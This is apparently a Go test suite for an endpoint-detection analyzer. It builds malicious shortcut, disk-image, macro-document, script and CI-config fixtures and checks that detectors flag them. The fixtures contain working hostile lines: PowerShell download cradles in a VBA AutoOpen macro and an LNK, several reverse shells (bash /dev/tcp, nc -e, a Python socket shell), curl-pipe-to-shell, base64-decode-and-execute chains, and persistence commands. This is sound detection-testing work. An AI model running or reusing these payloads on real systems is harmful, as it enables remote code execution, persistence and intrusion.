// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/rand"
	"strings"
	"testing"
	"time"
	"unicode/utf16"
)

// ---------- hand-built fixtures ----------

func utf16Bytes(s string) []byte {
	var out []byte
	for _, c := range utf16.Encode([]rune(s)) {
		out = append(out, byte(c), byte(c>>8))
	}
	return out
}

type lnkSpec struct {
	target, args, icon, rel string
	show                    uint32
	trailing                int
}

func buildLNK(s lnkSpec) []byte {
	h := make([]byte, 0x4c)
	copy(h, "\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
	flags := uint32(2 | 0x80) // HasLinkInfo | IsUnicode
	if s.rel != "" {
		flags |= 8
	}
	if s.args != "" {
		flags |= 0x20
	}
	if s.icon != "" {
		flags |= 0x40
	}
	binary.LittleEndian.PutUint32(h[0x14:], flags)
	binary.LittleEndian.PutUint32(h[0x3c:], s.show)
	// LinkInfo with a 16-byte VolumeID and a local base path.
	li := make([]byte, 44)
	binary.LittleEndian.PutUint32(li[4:], 28)
	binary.LittleEndian.PutUint32(li[8:], 1)
	binary.LittleEndian.PutUint32(li[12:], 28)
	binary.LittleEndian.PutUint32(li[16:], 44)
	binary.LittleEndian.PutUint32(li[24:], uint32(44+len(s.target)+1))
	li = append(li, []byte(s.target)...)
	li = append(li, 0, 0)
	binary.LittleEndian.PutUint32(li[0:], uint32(len(li)))
	out := append(h, li...)
	str := func(v string) {
		out = binary.LittleEndian.AppendUint16(out, uint16(len([]rune(v))))
		out = append(out, utf16Bytes(v)...)
	}
	if s.rel != "" {
		str(s.rel)
	}
	if s.args != "" {
		str(s.args)
	}
	if s.icon != "" {
		str(s.icon)
	}
	return append(out, make([]byte, s.trailing)...)
}

type isoFile struct {
	name string
	dir  bool
	sub  []isoFile
}

func isoRec(name []byte, lba, size uint32, dir bool) []byte {
	l := 33 + len(name)
	if l%2 == 1 {
		l++
	}
	r := make([]byte, l)
	r[0] = byte(l)
	binary.LittleEndian.PutUint32(r[2:], lba)
	binary.LittleEndian.PutUint32(r[10:], size)
	if dir {
		r[25] = 2
	}
	r[32] = byte(len(name))
	copy(r[33:], name)
	return r
}

func isoPack(recs [][]byte) []byte {
	var out []byte
	for _, r := range recs {
		if len(out)%isoSector+len(r) > isoSector {
			out = append(out, make([]byte, isoSector-len(out)%isoSector)...)
		}
		out = append(out, r...)
	}
	if len(out)%isoSector != 0 {
		out = append(out, make([]byte, isoSector-len(out)%isoSector)...)
	}
	return out
}

// buildISO makes an image: sector 16 PVD, optional Joliet SVD at 17, terminator,
// then the root directory and one sub-directory "files" holding sub.
func buildISO(root, sub []string, joliet bool) []byte {
	enc := func(s string) []byte {
		if joliet {
			var o []byte
			for _, c := range utf16.Encode([]rune(s)) {
				o = append(o, byte(c>>8), byte(c))
			}
			return o
		}
		return []byte(strings.ToUpper(s) + ";1")
	}
	if !joliet {
		enc = func(s string) []byte { return []byte(strings.ToUpper(s) + ";1") }
	}
	var rootRecs, subRecs [][]byte
	rootRecs = append(rootRecs, isoRec([]byte{0}, 19, isoSector, true), isoRec([]byte{1}, 19, isoSector, true))
	for _, n := range root {
		rootRecs = append(rootRecs, isoRec(enc(n), 100, 10, false))
	}
	rootRecs = append(rootRecs, isoRec(enc("files"), 20, isoSector, true))
	for _, n := range sub {
		subRecs = append(subRecs, isoRec(enc(n), 100, 10, false))
	}
	rootDir := isoPack(rootRecs)
	subDir := isoPack(subRecs)
	img := make([]byte, 16*isoSector)
	vd := func(typ byte, escape string) []byte {
		d := make([]byte, isoSector)
		d[0] = typ
		copy(d[1:], "CD001")
		d[6] = 1
		copy(d[40:], "TESTVOL")
		copy(d[88:], escape)
		copy(d[156:], isoRec([]byte{0}, 19, uint32(len(rootDir)), true)[:34])
		return d
	}
	img = append(img, vd(1, "")...)
	if joliet {
		img = append(img, vd(2, "%/E")...)
	}
	term := make([]byte, isoSector)
	term[0] = 255
	copy(term[1:], "CD001")
	img = append(img, term...)
	for len(img) < 19*isoSector {
		img = append(img, make([]byte, isoSector)...)
	}
	img = append(img, rootDir...)
	for len(img) < 20*isoSector {
		img = append(img, make([]byte, isoSector)...)
	}
	return append(img, subDir...)
}

// ovbaLiteral wraps src in an MS-OVBA container using literal tokens only.
func ovbaLiteral(src string) []byte {
	out := []byte{1}
	for i := 0; i < len(src); i += 3000 {
		part := []byte(src[i:min(i+3000, len(src))])
		var chunk []byte
		for j := 0; j < len(part); j += 8 {
			chunk = append(chunk, 0)
			chunk = append(chunk, part[j:min(j+8, len(part))]...)
		}
		hdr := uint16(0xb000 | (len(chunk) + 2 - 3))
		out = append(out, byte(hdr), byte(hdr>>8))
		out = append(out, chunk...)
	}
	return out
}

func buildOLEWithVBA(modules ...string) []byte {
	b := append([]byte("\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"), make([]byte, 504)...)
	b = append(b, utf16Bytes("_VBA_PROJECT")...)
	for _, m := range modules {
		b = append(b, make([]byte, 64)...)
		b = append(b, ovbaLiteral(m)...)
	}
	return b
}

const vbaMalicious = "Attribute VB_Name = \"ThisDocument\"\r\nSub AutoOpen()\r\n Dim o As Object\r\n Set o = CreateObject(\"WScript.Shell\")\r\n" +
	" o.Run \"powershell -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/x')\"\r\nEnd Sub\r\n"

const vbaBenign = "Attribute VB_Name = \"Module1\"\r\nSub Total()\r\n Range(\"A1\").Value = Range(\"A2\").Value + 1\r\nEnd Sub\r\n"

func fixtureLNKEvil() []byte {
	return buildLNK(lnkSpec{
		target: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		args:   `-w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"`,
		icon:   `C:\Users\Public\invoice.pdf`, rel: `..\..\powershell.exe`, show: 7,
	})
}

func artRun(kind, name string, data []byte, text string) *InspectReport {
	return RunAnalyzers(context.Background(), InspectInput{Kind: kind, Name: name, Data: data, Text: text})
}

func mustHaveIDs(t *testing.T, r *InspectReport, ids ...string) {
	t.Helper()
	fileMustHave(t, r, ids...)
}

func noPanic(t *testing.T, r *InspectReport, what string) {
	t.Helper()
	for _, e := range r.Errors {
		if strings.Contains(e, "panic") || strings.Contains(e, "recovered") {
			t.Fatalf("%s: analyzer panicked: %s", what, e)
		}
	}
}

func hasLimit(r *InspectReport, name string) bool {
	for _, l := range r.LimitsHit {
		if l == name {
			return true
		}
	}
	return false
}

// ---------- LNK ----------

func TestLNKGolden(t *testing.T) {
	r := artRun(InspectKindFile, "evil.lnk", fixtureLNKEvil(), "")
	if r.Format != "LNK" && !strings.Contains(r.Format, "LNK") {
		// Format is set by other analyzers; the LNK analyzer must at least run.
		t.Logf("format=%q", r.Format)
	}
	mustHaveIDs(t, r, "lnk-arguments", "lnk-lolbin-target", "lnk-args-download", "lnk-args-hidden", "lnk-args-iex", "lnk-icon-mismatch", "lnk-minimised")
	noPanic(t, r, "lnk")
	fileMustNotHave(t, r, "lnk-malformed", "lnk-unc-target", "lnk-long-args")
	found := false
	for _, i := range r.IOCs {
		found = found || (i.Type == "url" && strings.Contains(i.Value, "203.0.113.9"))
	}
	if !found {
		t.Errorf("URL IOC missing: %v", r.IOCs)
	}
	meta, _ := r.Meta["file-lnk.lnk"].(map[string]any)
	if meta == nil || !strings.HasSuffix(fmt.Sprint(meta["target"]), "powershell.exe") {
		t.Errorf("target not parsed: %v", r.Meta)
	}
	if r.Level == "clean" {
		t.Errorf("evil shortcut scored clean: %d", r.Score)
	}
}

func TestLNKBenignClean(t *testing.T) {
	r := artRun(InspectKindFile, "notes.lnk", buildLNK(lnkSpec{target: `C:\Windows\System32\notepad.exe`, args: `readme.txt`, show: 1}), "")
	if r.Level != "clean" {
		t.Fatalf("level %s %v", r.Level, r.Factors)
	}
	fileMustNotHave(t, r, "lnk-lolbin-target", "lnk-args-download", "lnk-minimised")
}

func TestLNKUNCAndPadding(t *testing.T) {
	r := artRun(InspectKindFile, "u.lnk", buildLNK(lnkSpec{target: `\\203.0.113.4\share\x.exe`, args: strings.Repeat(" ", 80) + "calc", trailing: 6000}), "")
	mustHaveIDs(t, r, "lnk-unc-target", "lnk-long-args", "lnk-appended-data")
}

func TestLNKLimitsAndTruncation(t *testing.T) {
	// Declared string length far above the data: must not over-read.
	full := buildLNK(lnkSpec{target: "C:\\a.exe", args: "x"})
	for cut := 0; cut < len(full); cut += 3 {
		r := artRun(InspectKindFile, "t.lnk", full[:cut], "")
		noPanic(t, r, fmt.Sprintf("cut %d", cut))
	}
	// Arguments longer than the per-field cap are truncated, not read whole.
	huge := buildLNK(lnkSpec{target: "C:\\cmd.exe", args: strings.Repeat("A", lnkMaxString+5000)})
	li, ok := parseLNK(huge)
	if !ok || len([]rune(li.Args)) != lnkMaxString {
		t.Fatalf("args len %d ok=%v", len([]rune(li.Args)), ok)
	}
	r := artRun(InspectKindFile, "h.lnk", huge, "")
	mustHaveIDs(t, r, "lnk-long-args")
	for _, f := range r.Findings {
		if len(f.Evidence) > InspectMaxStringLen+3 {
			t.Fatalf("evidence not capped: %d", len(f.Evidence))
		}
	}
}

// ---------- ISO / disk images ----------

func TestISOGolden(t *testing.T) {
	img := buildISO([]string{"autorun.inf", "setup.exe", "readme.txt"}, []string{"invoice.lnk", "payload.dll", "run.vbs"}, false)
	r := artRun(InspectKindFile, "x.iso", img, "")
	if r.Format != "ISO9660" {
		t.Fatalf("format %q", r.Format)
	}
	mustHaveIDs(t, r, "iso-autorun", "iso-executable", "iso-shortcut", "iso-script", "iso-lnk-plus-payload")
	if n, _ := r.Meta["file-diskimage.iso.entry_count"].(int); n < 7 {
		t.Errorf("entry_count %v", r.Meta["file-diskimage.iso.entry_count"])
	}
}

func TestISOJolietNames(t *testing.T) {
	img := buildISO([]string{"A very long document name.pdf.lnk"}, []string{"Loader.exe"}, true)
	r := artRun(InspectKindFile, "j.iso", img, "")
	mustHaveIDs(t, r, "iso-shortcut", "iso-executable", "iso-lnk-plus-payload")
	fileMustNotHave(t, r, "iso-autorun")
}

func TestISOBenign(t *testing.T) {
	r := artRun(InspectKindFile, "docs.iso", buildISO([]string{"readme.txt", "photo.jpg"}, []string{"a.txt"}, false), "")
	fileMustNotHave(t, r, "iso-autorun", "iso-executable", "iso-shortcut", "iso-script")
	if r.Level != "clean" {
		t.Errorf("level %s %v", r.Level, r.Factors)
	}
}

func TestISONestedAutorunNotRoot(t *testing.T) {
	r := artRun(InspectKindFile, "n.iso", buildISO([]string{"a.txt"}, []string{"autorun.inf"}, false), "")
	fileMustNotHave(t, r, "iso-autorun")
}

func TestISOLimits(t *testing.T) {
	// More entries than the cap.
	var recs [][]byte
	recs = append(recs, isoRec([]byte{0}, 19, isoSector, true))
	for i := 0; i < isoMaxEntries+500; i++ {
		recs = append(recs, isoRec([]byte(fmt.Sprintf("F%05d.TXT;1", i)), 100, 1, false))
	}
	rootDir := isoPack(recs)
	img := buildISO(nil, nil, false)[:19*isoSector]
	copy(img[16*isoSector+156:], isoRec([]byte{0}, 19, uint32(len(rootDir)), true)[:34])
	img = append(img, rootDir...)
	r := artRun(InspectKindFile, "big.iso", img, "")
	if !hasLimit(r, "file-diskimage:iso-entries") {
		t.Errorf("limits %v", r.LimitsHit)
	}
	if n, _ := r.Meta["file-diskimage.iso.entry_count"].(int); n != isoMaxEntries {
		t.Errorf("entry_count %d", n)
	}
	if !hasLimit(r, "file-diskimage:iso-listing") {
		t.Errorf("listing cap not reported: %v", r.LimitsHit)
	}

	// A directory that lists itself must terminate.
	loop := isoPack([][]byte{isoRec([]byte{0}, 19, isoSector, true), isoRec([]byte("LOOP;1"), 19, isoSector, true)})
	img2 := buildISO(nil, nil, false)[:19*isoSector]
	copy(img2[16*isoSector+156:], isoRec([]byte{0}, 19, uint32(len(loop)), true)[:34])
	img2 = append(img2, loop...)
	done := make(chan *InspectReport, 1)
	go func() { done <- artRun(InspectKindFile, "loop.iso", img2, "") }()
	select {
	case rr := <-done:
		noPanic(t, rr, "loop")
	case <-time.After(5 * time.Second):
		t.Fatal("directory loop did not terminate")
	}
}

func TestDiskImageContainersRecognised(t *testing.T) {
	vhdx := append([]byte("vhdxfile"), make([]byte, 1024)...)
	r := artRun(InspectKindFile, "d.vhdx", vhdx, "")
	mustHaveIDs(t, r, "disk-image-unlisted")
	vhd := append(make([]byte, 1024), make([]byte, 512)...)
	copy(vhd[len(vhd)-512:], "conectix")
	mustHaveIDs(t, artRun(InspectKindFile, "d.vhd", vhd, ""), "disk-image-unlisted")
}

// ---------- VBA ----------

func TestOVBADecompressCopyToken(t *testing.T) {
	got := string(ovbaDecompress([]byte{1, 0x05, 0xb0, 0x08, 'a', 'b', 'c', 0x03, 0x20}))
	if got != "abcabcabc" {
		t.Fatalf("got %q", got)
	}
	if out := ovbaDecompress([]byte{1, 0x05, 0xb0, 0x08, 'a', 'b', 'c', 0xff, 0xff}); string(out) != "abc" {
		t.Fatalf("bad offset should stop decoding, got %q", out)
	}
}

func TestVBAGoldenOLE(t *testing.T) {
	r := artRun(InspectKindFile, "old.doc", buildOLEWithVBA(vbaMalicious), "")
	mustHaveIDs(t, r, "vba-autoexec", "vba-shell-object", "vba-download-exec", "file-ole-macro")
	if n, _ := r.Meta["file-vba.vba.modules_recovered"].(int); n != 1 {
		t.Errorf("modules %v", r.Meta)
	}
	found := false
	for _, i := range r.IOCs {
		found = found || strings.Contains(i.Value, "203.0.113.5")
	}
	if !found {
		t.Errorf("IOC missing %v", r.IOCs)
	}
	if r.Level == "clean" {
		t.Errorf("score %d", r.Score)
	}
}

func TestVBAGoldenOOXML(t *testing.T) {
	docx := fileBuildDocx(
		fileZent{name: "word/vbaProject.bin", data: buildOLEWithVBA(vbaMalicious)},
		fileZent{name: "[Content_Types].xml\x00dup", data: nil},
	)
	_ = docx
	z := fileBuildZip([]fileZent{
		{name: "[Content_Types].xml", data: []byte(`<Types><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>`)},
		{name: "word/document.xml", data: []byte(`<w:document/>`)},
		{name: "word/vbaProject.bin", data: buildOLEWithVBA(vbaMalicious)},
	})
	r := artRun(InspectKindFile, "m.docm", z, "")
	mustHaveIDs(t, r, "vba-autoexec", "vba-shell-object", "file-ooxml-macro")
}

func TestVBAObfuscationAndWinAPI(t *testing.T) {
	var sb strings.Builder
	sb.WriteString("Attribute VB_Name = \"M\"\r\nPrivate Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (a As Long) As Long\r\nPrivate Declare PtrSafe Sub RtlMoveMemory Lib \"kernel32\" (a As Long)\r\nSub Document_Open()\r\n s = \"\"\r\n")
	for i := 0; i < 20; i++ {
		sb.WriteString(fmt.Sprintf(" s = s & Chr(%d)\r\n", 97+i%20))
	}
	sb.WriteString("End Sub\r\n")
	r := artRun(InspectKindFile, "o.xls", buildOLEWithVBA(sb.String()), "")
	mustHaveIDs(t, r, "vba-autoexec", "vba-winapi", "vba-obfuscated-strings")
}

func TestVBADeobLayerFed(t *testing.T) {
	// Chr()-built download cradle: the shared decoder must recover it and the
	// layer must appear in the report's layer log.
	cradle := "iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/y')"
	var parts []string
	for _, c := range cradle {
		parts = append(parts, fmt.Sprintf("Chr(%d)", c))
	}
	src := "Attribute VB_Name = \"M\"\r\nSub AutoOpen()\r\n x = " + strings.Join(parts, " & ") + "\r\n CreateObject(\"WScript.Shell\").Run x\r\nEnd Sub\r\n"
	r := artRun(InspectKindFile, "c.doc", buildOLEWithVBA(src), "")
	if len(r.Layers) == 0 {
		t.Fatalf("no layers logged: %v", r.Findings)
	}
	if !strings.HasPrefix(r.Layers[0].Method, "vba:") {
		t.Errorf("layer method %q", r.Layers[0].Method)
	}
}

func TestVBABenign(t *testing.T) {
	r := artRun(InspectKindFile, "ok.xls", buildOLEWithVBA(vbaBenign), "")
	fileMustNotHave(t, r, "vba-autoexec", "vba-shell-object", "vba-winapi", "vba-obfuscated-strings", "vba-download-exec")
	if r.Level == "malicious-likely" || r.Level == "suspicious" {
		t.Errorf("benign macro level %s", r.Level)
	}
}

func TestVBANoSource(t *testing.T) {
	data := append([]byte("\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"), make([]byte, 600)...)
	data = append(data, utf16Bytes("_VBA_PROJECT")...)
	mustHaveIDs(t, artRun(InspectKindFile, "p.doc", data, ""), "vba-no-source")
}

func TestVBALimits(t *testing.T) {
	// Decoy prologues: attempts are capped.
	var decoy []byte
	decoy = append(decoy, "\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"...)
	for i := 0; i < vbaMaxCarve+200; i++ {
		decoy = append(decoy, "\x00Attribut"...)
	}
	r := artRun(InspectKindFile, "d.doc", decoy, "")
	if !hasLimit(r, "file-vba:vba-carve-attempts") {
		t.Errorf("limits %v", r.LimitsHit)
	}
	// More valid modules than the cap.
	var mods []string
	for i := 0; i < vbaMaxModules+20; i++ {
		mods = append(mods, fmt.Sprintf("Attribute VB_Name = \"M%d\"\r\nSub X%d()\r\nEnd Sub\r\n", i, i))
	}
	r = artRun(InspectKindFile, "many.doc", buildOLEWithVBA(mods...), "")
	if !hasLimit(r, "file-vba:vba-modules") {
		t.Errorf("limits %v", r.LimitsHit)
	}
	if n, _ := r.Meta["file-vba.vba.modules_recovered"].(int); n != vbaMaxModules {
		t.Errorf("modules %d", n)
	}
	// Decompression output is capped.
	bomb := []byte{1}
	for i := 0; i < 600; i++ { // each chunk expands 4096 bytes from a short copy run
		bomb = append(bomb, 0x05, 0xb0, 0x08, 'a', 'b', 'c', 0x03, 0x20)
	}
	if out := ovbaDecompress(bomb); len(out) > vbaMaxSource+4096 {
		t.Errorf("decompressed %d", len(out))
	}
}

// ---------- script static ----------

func b64s(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

func scriptRun(text string) *InspectReport { return artRun(InspectKindScript, "s", nil, text) }

func TestScriptStaticGolden(t *testing.T) {
	cases := []struct {
		name, text string
		want       []string
	}{
		{"curl-pipe", "#!/bin/sh\ncurl -fsSL http://203.0.113.7/i.sh | sudo bash\n", []string{"scr-download-exec"}},
		{"bash-subst", "bash -c \"$(curl -s http://203.0.113.7/x)\"", []string{"scr-download-exec"}},
		{"py-urlopen", "import urllib.request\nexec(urllib.request.urlopen('http://203.0.113.7/p').read())\n", []string{"scr-download-exec"}},
		{"js-fetch", "(async()=>{ eval(await fetch('http://203.0.113.7/p.js').then(r=>r.text())) })()", []string{"scr-download-exec"}},
		{"devtcp", "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n", []string{"scr-reverse-shell"}},
		{"nc-e", "nc -e /bin/sh 203.0.113.7 4444", []string{"scr-reverse-shell"}},
		{"py-revshell", "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('203.0.113.7',4444))\nos.dup2(s.fileno(),0)\n", []string{"scr-reverse-shell"}},
		{"py-eval-b64", "exec(base64.b64decode('aW1wb3J0IG9zOyBwcmludCgxKQ=='))\n", []string{"scr-eval-decoded"}},
		{"sh-b64-sh", "echo ZWNobyBoZWxsbyB3b3JsZA== | base64 -d | sh\n", []string{"scr-eval-decoded"}},
		{"js-atob", "eval(atob('YWxlcnQoMSk7YWxlcnQoMik7'))", []string{"scr-eval-decoded"}},
		{"cron", "(crontab -l; echo '* * * * * /tmp/x') | crontab -\n", []string{"scr-persist-cron"}},
		{"systemd", "cat > /etc/systemd/system/x.service <<EOF\n[Service]\nEOF\necho a >> /etc/systemd/system/y.service", []string{"scr-persist-systemd"}},
		{"bashrc", "echo 'curl x' >> ~/.bashrc", []string{"scr-persist-shellrc"}},
		{"sshkey", "echo ssh-rsa AAAA >> /root/.ssh/authorized_keys", []string{"scr-persist-sshkey"}},
		{"preload", "echo /tmp/x.so > /etc/ld.so.preload", []string{"scr-persist-preload"}},
		{"launchd", "cp a.plist ~/Library/LaunchAgents/com.x.plist && launchctl load a", []string{"scr-persist-launchd"}},
		{"schtasks", "schtasks /create /tn x /tr calc.exe /sc minute", []string{"scr-persist-wintask"}},
	}
	for _, c := range cases {
		r := scriptRun(c.text)
		noPanic(t, r, c.name)
		m := fileFindingIDs(r)
		for _, id := range c.want {
			if _, ok := m[id]; !ok {
				t.Errorf("%s: missing %s; have %v", c.name, id, fileKeysOf(m))
			}
		}
	}
}

func TestScriptStaticBenign(t *testing.T) {
	benign := []string{
		"#!/bin/bash\nset -e\nfor f in *.log; do gzip \"$f\"; done\necho done\n",
		"import json\nwith open('a.json') as f:\n    d = json.load(f)\nprint(d)\n",
		"const fs = require('fs');\nconsole.log(fs.readFileSync('a.txt', 'utf8'));\n",
		"curl -fsSL https://example.org/file.tar.gz -o /tmp/f.tgz\ntar xzf /tmp/f.tgz\n",
		"echo 'export PATH=$PATH:/opt/bin' > /tmp/env.sh\n",
	}
	for _, s := range benign {
		r := scriptRun(s)
		for _, f := range r.Findings {
			if strings.HasPrefix(f.ID, "scr-") {
				t.Errorf("benign script flagged %s: %q", f.ID, s)
			}
		}
	}
}

func TestScriptStaticDecodedLayerFeedsLog(t *testing.T) {
	inner := `import os
os.system("curl http://203.0.113.9/a.sh | sh")`
	text := "exec(base64.b64decode('" + b64s(inner) + "'))\n"
	r := scriptRun(text)
	m := fileFindingIDs(r)
	if _, ok := m["scr-eval-decoded"]; !ok {
		t.Fatalf("no eval finding: %v", fileKeysOf(m))
	}
	f, ok := m["scr-download-exec"]
	if !ok || !strings.Contains(f.Evidence, "decoded layer 1") {
		t.Fatalf("second stage not reported from layer: %+v", f)
	}
	var layer *InspectLayer
	for i := range r.Layers {
		if r.Layers[i].Method == "script:eval-b64-literal" {
			layer = &r.Layers[i]
		}
	}
	if layer == nil || !strings.Contains(layer.Preview, "203.0.113.9") {
		t.Fatalf("layer log missing decoded layer: %+v", r.Layers)
	}
	found := false
	for _, i := range r.IOCs {
		found = found || strings.Contains(i.Value, "203.0.113.9")
	}
	if !found {
		t.Errorf("IOC from decoded layer missing")
	}
}

func TestScriptStaticLimits(t *testing.T) {
	// Nesting beyond scriptMaxDepth.
	payload := "echo done and more text here"
	for i := 0; i < scriptMaxDepth+2; i++ {
		payload = "exec(base64.b64decode('" + b64s(payload) + "'))"
	}
	r := scriptRun(payload)
	if !hasLimit(r, "script-static:script-decode-depth") {
		t.Errorf("depth limit not reported: %v", r.LimitsHit)
	}
	// More blobs than the cap.
	var sb strings.Builder
	for i := 0; i < scriptMaxBlobs+8; i++ {
		sb.WriteString(fmt.Sprintf("x%d = atob('%s')\n", i, b64s(fmt.Sprintf("echo hello world number %d", i))))
	}
	r = scriptRun(sb.String())
	if !hasLimit(r, "script-static:script-blobs") {
		t.Errorf("blob limit not reported: %v", r.LimitsHit)
	}
	nStatic := 0
	for _, l := range r.Layers {
		if l.Method == "script:eval-b64-literal" {
			nStatic++
		}
	}
	if nStatic > scriptMaxLayers {
		t.Errorf("layer log grew past cap: %d", nStatic)
	}
	if len(r.Layers) > InspectMaxLayers {
		t.Errorf("layers %d", len(r.Layers))
	}
	// Oversized input is truncated for scanning and still finishes.
	big := strings.Repeat("echo hello world\n", (scriptMaxScan+1<<20)/17)
	start := time.Now()
	r = scriptRun(big)
	if !hasLimit(r, "script-static:script-truncated") {
		t.Errorf("truncation not reported: %v", r.LimitsHit)
	}
	if time.Since(start) > InspectTotalTime {
		t.Errorf("took %v", time.Since(start))
	}
}

// ---------- config extra ----------

func cfgRun(name, text string) *InspectReport { return artRun(InspectKindConfig, name, nil, text) }

const ghPwn = `name: ci
on:
  pull_request_target:
    types: [opened]
permissions: write-all
jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "${{ github.event.pull_request.title }}"
      - run: curl -s https://x.example/i.sh | bash
`

const ghGood = `name: ci
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: make test
`

func TestConfigExtraGitHubGolden(t *testing.T) {
	r := cfgRun(".github/workflows/ci.yml", ghPwn)
	mustHaveIDs(t, r, "cfgx-gha-pwn-request", "cfgx-gha-script-injection", "cfgx-gha-write-all", "cfgx-gha-curl-pipe", "cfgx-gha-self-hosted-pr", "cfgx-gha-unpinned-action")
	if r.Level != "not_scored" || r.Score != 0 {
		t.Fatalf("config must be not_scored, got %s/%d", r.Level, r.Score)
	}
	for _, f := range r.Findings {
		if f.Weight != 0 {
			t.Errorf("%s has weight %d", f.ID, f.Weight)
		}
	}
	if r.Format != "config/github-actions" {
		t.Errorf("format %q", r.Format)
	}
}

func TestConfigExtraGitHubClean(t *testing.T) {
	r := cfgRun("ci.yml", ghGood)
	for _, f := range r.Findings {
		if strings.HasPrefix(f.ID, "cfgx-") {
			t.Errorf("clean workflow flagged %s", f.ID)
		}
	}
}

func TestConfigExtraGitLab(t *testing.T) {
	text := "stages:\n  - build\nvariables:\n  DB_PASSWORD: hunter2hunter2\n  DOCKER_TLS_CERTDIR: \"\"\nbuild:\n  image: alpine\n  stage: build\n  script:\n    - curl -s http://x.example/i | sh\n"
	r := cfgRun(".gitlab-ci.yml", text)
	mustHaveIDs(t, r, "cfgx-gl-curl-pipe", "cfgx-gl-latest-image", "cfgx-gl-literal-secret", "cfgx-gl-dind-notls")
	if r.Level != "not_scored" {
		t.Errorf("level %s", r.Level)
	}
}

func TestConfigExtraK8sAndDockerfile(t *testing.T) {
	k8s := "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: x\nsubjects:\n- kind: User\n  name: system:anonymous\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n"
	r := cfgRun("crb.yaml", k8s)
	mustHaveIDs(t, r, "cfgx-k8s-anonymous-binding")
	secret := "apiVersion: v1\nkind: Secret\nmetadata:\n  name: s\nstringData:\n  password: hunter2\n"
	mustHaveIDs(t, cfgRun("s.yaml", secret), "cfgx-k8s-inline-secret")
	df := "FROM alpine:3.20\nRUN apk add netcat-openbsd && nc -e /bin/sh 203.0.113.7 4444\nRUN echo " + strings.Repeat("QUJD", 12) + " | base64 -d | sh\n"
	r = cfgRun("Dockerfile", df)
	mustHaveIDs(t, r, "cfgx-df-reverse-shell", "cfgx-df-decode-exec")
	if r.Level != "not_scored" {
		t.Errorf("level %s", r.Level)
	}
	ok := cfgRun("Dockerfile", "FROM alpine:3.20\nRUN apk add curl\nUSER app\n")
	for _, f := range ok.Findings {
		if strings.HasPrefix(f.ID, "cfgx-") {
			t.Errorf("benign Dockerfile flagged %s", f.ID)
		}
	}
}

func TestConfigExtraLimits(t *testing.T) {
	big := "on: push\njobs:\n  a:\n    runs-on: x\n" + strings.Repeat("      - run: echo hi\n", (cfgxMaxScan+1<<20)/22)
	r := cfgRun("ci.yml", big)
	if !hasLimit(r, "config-extra:config-truncated") {
		t.Errorf("limits %v", r.LimitsHit)
	}
	if r.Level != "not_scored" {
		t.Errorf("level %s", r.Level)
	}
}

// ---------- fuzz and mutation ----------

func fuzzOnce(t testing.TB, data []byte) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	for _, in := range []InspectInput{
		{Kind: InspectKindFile, Name: "f", Data: data},
		{Kind: InspectKindScript, Name: "f", Text: string(data)},
		{Kind: InspectKindConfig, Name: "f.yml", Text: string(data)},
		{Kind: InspectKindConfig, Name: "Dockerfile", Text: string(data)},
	} {
		r := RunAnalyzers(ctx, in)
		for _, e := range r.Errors {
			if strings.Contains(e, "panic") || strings.Contains(e, "recovered") {
				t.Fatalf("%s panicked: %s", in.Kind, e)
			}
		}
	}
}

func fuzzSeeds() [][]byte {
	return [][]byte{
		fixtureLNKEvil(),
		buildISO([]string{"autorun.inf", "a.exe"}, []string{"b.lnk"}, false),
		buildISO([]string{"x.lnk"}, nil, true),
		buildOLEWithVBA(vbaMalicious),
		fileBuildZip([]fileZent{{name: "word/vbaProject.bin", data: buildOLEWithVBA(vbaMalicious)}, {name: "[Content_Types].xml", data: []byte("macroEnabled")}}),
		[]byte(ghPwn),
		[]byte("bash -i >& /dev/tcp/1.2.3.4/9 0>&1\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"),
		[]byte("FROM a\nRUN nc -e /bin/sh x 1\n"),
	}
}

func TestArtifactAnalyzersMutations(t *testing.T) {
	rng := rand.New(rand.NewSource(7))
	for si, seed := range fuzzSeeds() {
		fuzzOnce(t, seed)
		for i := 0; i < 24; i++ {
			m := append([]byte(nil), seed...)
			switch i % 3 {
			case 0:
				for k := 0; k < 1+rng.Intn(8) && len(m) > 0; k++ {
					m[rng.Intn(len(m))] = byte(rng.Intn(256))
				}
			case 1:
				m = m[:rng.Intn(len(m)+1)]
			case 2:
				if len(m) > 8 {
					p := rng.Intn(len(m) - 4)
					binary.LittleEndian.PutUint32(m[p:], rng.Uint32())
				}
			}
			func() {
				defer func() {
					if r := recover(); r != nil {
						t.Fatalf("seed %d iter %d panicked: %v", si, i, r)
					}
				}()
				fuzzOnce(t, m)
			}()
		}
	}
}

func FuzzArtifactAnalyzers(f *testing.F) {
	for _, s := range fuzzSeeds() {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 1<<20 {
			t.Skip()
		}
		fuzzOnce(t, data)
	})
}
